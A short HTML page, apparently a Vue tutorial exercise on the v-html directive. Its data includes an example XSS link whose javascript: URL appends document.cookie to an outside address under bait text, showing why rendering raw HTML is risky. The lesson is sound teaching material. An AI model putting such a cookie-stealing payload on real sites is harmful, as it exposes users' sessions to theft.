<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>v-html</title>
    </head>
    <body>
        <div id="app">
            <div v-html="name"></div>
            <div v-html="str"></div>
        </div>

        <script src="../js/vue.js"></script>
        <script>
            Vue.config.productionTip = false; // 阻止 Vue 在启动时生成生产环境提示

            new Vue({
                el: '#app',
                data: {
                    name: '<h3>isYangs</h3>',
                    str:'<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>这有你想要的资源</a>'
                },
            });
        </script>
    </body>
</html>
